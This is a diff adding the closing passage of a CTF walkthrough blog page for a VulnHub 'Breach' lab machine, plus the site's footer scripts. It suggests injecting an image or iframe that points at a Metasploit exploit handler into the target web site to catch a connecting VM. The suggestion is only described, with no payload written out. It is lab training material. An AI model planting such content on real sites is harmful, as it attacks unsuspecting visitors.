+<p>During the enumeration process the following netstat output is quite intriguing.</p>
+
+
+
+<figure class="fcenter fmedium">
+    <a href="/img/post/2017/vulnhub-breach-3/hydra.png" data-lightbox="default" data-title="The other VM at 192.168.122.28 connects to this machine on port 8800/tcp." >
+        <img src="/img/post/2017/vulnhub-breach-3/hydra.png" alt="The other VM at 192.168.122.28 connects to this machine on port 8800/tcp." >
+    </a>
+</figure>
+
+
+
+<p>Unfortunately finding out which page the system is accessing is not so easy.
+The apache log files cannot be accessed.
+Without root tcpdump is not going to help either.</p>
+
+<p>The fastest way to find out is to inject a malicious content in the web site.
+With an image or iframe that references a metasploit exploit handler might be a quick win.</p>
+
+<h1 id="links">Links</h1>
+
+<ul>
+<li><a href="https://www.vulnhub.com/entry/breach-21,159/">Breach 2.1</a></li>
+</ul>
+
+    </div>
+  </div>
+
+  <ul class="pager">
+    
+
+    
+      
+        &nbsp;<li class="previous"><a href="http://localhost:1313/blog/2018/01/SANS-Holiday-Hack-Challenge-2017-Solution/"> SANS Holiday Hack Challenge 2017 Solution</a></li>
+      
+    
+    
+      
+        &nbsp;<li class="next"><a href="http://localhost:1313/blog/2017/03/Vulnhub---Breach-2.1-boot2root-CTF-walkthrough/"> Vulnhub - Breach 2.1 boot2root CTF walkthrough</a></li>
+      
+    
+  </ul>
+
+
+
+<footer>
+
+  <p class="text-muted credit">&copy; 2018. All rights reserved. </p>
+
+  
+  
+
+  <script type="text/javascript" src="http://localhost:1313//js/jquery-2.1.4.js"></script>
+
+  <script src="http://localhost:1313//js/bootstrap.min.js"></script>
+  <script src="http://localhost:1313//js/bootstrap.js"></script>
+  <script type="text/javascript" src="http://localhost:1313//js/hc.js"></script>
+
+  
+  <script type="text/javascript" src="http://localhost:1313//lightbox/js/lightbox.js"></script>
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+    ga('create', "UA-83225898-1", 'auto');
+    ga('send', 'pageview');
+  </script>
+  
+
+  
+
+</footer>
+
+	<script data-no-instant>document.write('<script src="/livereload.js?port=1313&mindelay=10"></' + 'script>')</script></body>
+</html>
